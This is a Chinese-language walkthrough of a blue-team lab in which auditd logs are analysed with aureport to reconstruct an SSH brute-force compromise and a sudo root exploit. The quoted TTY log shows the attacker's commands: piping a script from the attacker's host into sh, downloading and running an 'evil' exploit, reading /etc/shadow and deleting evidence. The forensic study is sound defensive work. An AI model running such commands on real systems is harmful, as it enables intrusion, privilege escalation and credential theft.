---
title: BTLO - Paranoid
tags: [BTLO, Incident Response]

category: "Security Practice｜BTLO｜Incident Response"
date: 2024-01-31
---

# BTLO - Paranoid
<!-- more -->
Challenge: https://blueteamlabs.online/home/challenge/paranoid-e5e164befb

:::spoiler TOC
[TOC]
:::
:::info
此lab大部分是參考[^wp1]的說明，因為本身第一次接觸aureport，所以不太清楚指令或者是注意的地方
:::

## Tool
AUReport: `$ sudo apt install auditd`
Linux CLI

## Background
```bash
aureport --help
usage: aureport [options]
        -a,--avc                        Avc report
        -au,--auth                      Authentication report
        --comm                          Commands run report
        -c,--config                     Config change report
        -cr,--crypto                    Crypto report
        --debug                         Write malformed events that are skipped to stderr
        --eoe-timeout secs              End of Event Timeout
        -e,--event                      Event report
        --escape option                 Escape output
        -f,--file                       File name report
        --failed                        only failed events in report
        -h,--host                       Remote Host name report
        --help                          help
        -i,--interpret                  Interpretive mode
        -if,--input <Input File name>   use this file as input
        --input-logs                    Use the logs even if stdin is a pipe
        --integrity                     Integrity event report
        -k,--key                        Key report
        -l,--login                      Login report
        -m,--mods                       Modification to accounts report
        -ma,--mac                       Mandatory Access Control (MAC) report
        -n,--anomaly                    aNomaly report
        -nc,--no-config                 Don''t include config events
        --node <node name>              Only events from a specific node
        -p,--pid                        Pid report
        -r,--response                   Response to anomaly report
        -s,--syscall                    Syscall report
        --success                       only success events in report
        --summary                       sorted totals for main object in report
        -t,--log                        Log time range report
        -te,--end [end date] [end time] ending date & time for reports
        -tm,--terminal                  TerMinal name report
        -ts,--start [start date] [start time]   starting data & time for reports
        --tty                           Report about tty keystrokes
        -u,--user                       User name report
        -v,--version                    Version
        --virt                          Virtualization report
        -x,--executable                 eXecutable name report
        If no report is given, the summary report will be displayed
```
![圖片](https://hackmd.io/_uploads/B17xQgJOa.png)

## 起手式
```bash
$ sudo aureport --summary -if audit.log

Summary Report
======================
Range of time in logs: 10/05/21 08:22:07.664 - 10/05/21 08:28:06.610
Selected time for report: 10/05/21 08:22:07 - 10/05/21 08:28:06.610
Number of changes in configuration: 15
Number of changes to accounts, groups, or roles: 0
Number of logins: 1
Number of failed logins: 87
Number of authentications: 3
Number of failed authentications: 89
Number of users: 3
Number of terminals: 10
Number of host names: 6
Number of executables: 115
Number of commands: 192
Number of files: 298
Number of AVC's: 0
Number of MAC events: 0
Number of failed syscalls: 1606
Number of anomaly events: 0
Number of responses to anomaly events: 0
Number of crypto events: 0
Number of integrity events: 0
Number of virt events: 0
Number of keys: 1
Number of process IDs: 10679
Number of events: 16732
```

## ==Q1==
> What account was compromised?

### Recon
既然是和帳號有關那就是和authentication有關，所以可以先用summary看他有多少user(結果如上)，再用`-au`指令看成功(失敗)的認證有多少
```bash
$ sudo aureport -if audit.log -au

Authentication Report
============================================
# date time acct host term exe success event
============================================
1. 10/05/21 08:22:39 btlo 192.168.4.155 ssh /usr/sbin/sshd no 465368
2. 10/05/21 08:22:39 btlo 192.168.4.155 ssh /usr/sbin/sshd no 465374
3. 10/05/21 08:22:39 btlo 192.168.4.155 ssh /usr/sbin/sshd no 465381
4. 10/05/21 08:22:39 btlo 192.168.4.155 ssh /usr/sbin/sshd no 465382
5. 10/05/21 08:22:39 btlo 192.168.4.155 ssh /usr/sbin/sshd no 465384
...
85. 10/05/21 08:22:55 btlo 192.168.4.155 ssh /usr/sbin/sshd yes 465936
...
89. 10/05/21 08:23:13 btlo 192.168.4.155 ssh /usr/sbin/sshd yes 467550
...
90. 10/05/21 08:23:34 btlo ? /dev/pts/1 /usr/bin/sudo yes 468442
91. 10/05/21 08:25:40 btlo ? /dev/pts/1 /usr/bin/sudo no 473858
92. 10/05/21 08:25:41 btlo ? /dev/pts/1 /usr/bin/sudo no 473860
```
可以發現account name都是==btlo==，不過奇怪的是前面有一大堆的認證失敗，到最後才有三次的認證成功，所以我們可以很清楚的知道攻擊者就是==192.168.4.155==嘗試用==bruteforce==的方式透過ssh登入進來

:::spoiler Flag
Flag: `btlo`
:::

## ==Q2==
> What attack type was used to gain initial access?

### Recon
呈上題

:::spoiler Flag
Flag: `bruteforce`
:::

## ==Q3==
> What is the attacker's IP address?

### Recon
呈上題

:::spoiler Flag
Flag: `192.168.4.155`
:::

## ==Q4==
> What tool was used to perform system enumeration?

### Recon
根據[^wp1]的說明，此時要使用到`--tty`的參數列出登入進來之後下甚麼command
```bash
sudo aureport -if audit.log --tty

TTY Report
===============================================
# date time event auid term sess comm data
===============================================
1. 10/05/21 08:23:16 468403 1001 pts1 49 sh "hostname",<nl>
2. 10/05/21 08:23:21 468408 1001 pts1 49 sh "whoami",<nl>
3. 10/05/21 08:23:26 468414 1001 pts1 49 sh "ls",<nl>
4. 10/05/21 08:23:27 468419 1001 pts1 49 sh "sudo -l",<nl>
5. 10/05/21 08:23:34 468447 1001 pts1 49 sh <nl>
6. 10/05/21 08:23:37 468450 1001 pts1 49 sh "wget -O - http://192.168.4.155:8000/linpeas.sh | sh",<nl>
7. 10/05/21 08:26:21 480914 1001 pts1 49 sh "lsb_release -a",<nl>
8. 10/05/21 08:26:31 480921 1001 pts1 49 sh "sudo -V",<nl>
9. 10/05/21 08:26:36 480934 1001 pts1 49 sh "wget http://192.168.4.155:8000/evil.tar.gz",<nl>
10. 10/05/21 08:26:45 480944 1001 pts1 49 sh "ls",<nl>
11. 10/05/21 08:26:50 480947 1001 pts1 49 sh "tar zxvf evil.tar.gz",<nl>
12. 10/05/21 08:26:59 480982 1001 pts1 49 sh "cd evil",<nl>
13. 10/05/21 08:27:03 480984 1001 pts1 49 sh "ls",<nl>
14. 10/05/21 08:27:06 480987 1001 pts1 49 sh "make",<nl>
15. 10/05/21 08:27:10 481020 1001 pts1 49 sh "./evil 0",<nl>
16. 10/05/21 08:27:17 481039 1001 pts1 49 sh "whoami",<nl>
17. 10/05/21 08:27:21 481050 1001 pts1 49 sh "rm -rf /home/btlo/evil",<nl>
18. 10/05/21 08:27:39 481059 1001 pts1 49 sh "rm  /home/btlo/evil.tar.gz",<nl>
19. 10/05/21 08:27:45 481062 1001 pts1 49 sh "cat /etc/shadow",<nl>
20. 10/05/21 08:27:50 481064 1001 pts1 49 sh "exit",<nl>
21. 10/05/21 08:27:53 481065 1001 pts1 49 sh "exit",<nl>
```
從以上結果得知，攻擊者進來以後先recon一下(hostname / whoami / ls / sudo -l(查看目前的身分可以下甚麼command))，最重要的是他wget了一個linpeas.sh，這是一個專用於linux based的提權工具，詳細的資訊可以看[Linux權限提升研究: 自動化信息收集](https://cloud.tencent.com/developer/article/1841447)，甚至後面下載了一個evil，應該是自己寫的或是自己蒐集的武器庫，提權完了之後就是要查看最重要的地方，也就是==/etc/shadow==，就是真實存密碼的地方

:::spoiler Flag
Flag: `linpeas`
:::

## ==Q5==
> What is the name of the binary and pid used to gain root?

### Recon
既然我們已經知道他下載了一個evil tar並且執行其中的script，那麼在process紀錄中一定有相關資訊，此時可以下`-p`列出所有process list，然後我們要著重在evil這個key word，所以記得grep

### Exploit
```bash
$ sudo aureport -if audit.log -p | grep "evil"
# date time acct host term exe success event
16156. 10/05/21 08:27:17 829992 /home/btlo/evil/evil 59 1001 481021
```

:::spoiler Flag
Flag: `evil, 829992`
:::

## ==Q6==
> What CVE was exploited to gain root access? (Do your research!)

### Recon
只要上網找這一題的題目就會出現相關的CVE
![圖片](https://hackmd.io/_uploads/HyiwqlydT.png)

:::spoiler Flag
Flag: `CVE-2021-3156`
:::

## ==Q7==
> What type of vulnerability is this?

### Recon
呈上題，也可以看[chatgpt的回答](https://chat.openai.com/share/197d29c6-3298-45b2-b332-cd0f6e814a2f)

:::spoiler Flag
Flag: `heap_based buffer overflow`
:::

## ==Q8==
> What file was exfiltrated once root was gained?

### Recon
呈第4題

:::spoiler Flag
Flag: `/etc/shadow`
:::

## Reference
[^wp1]:[BTLO - Paranoid](https://05t3.github.io/posts/Paranoid/)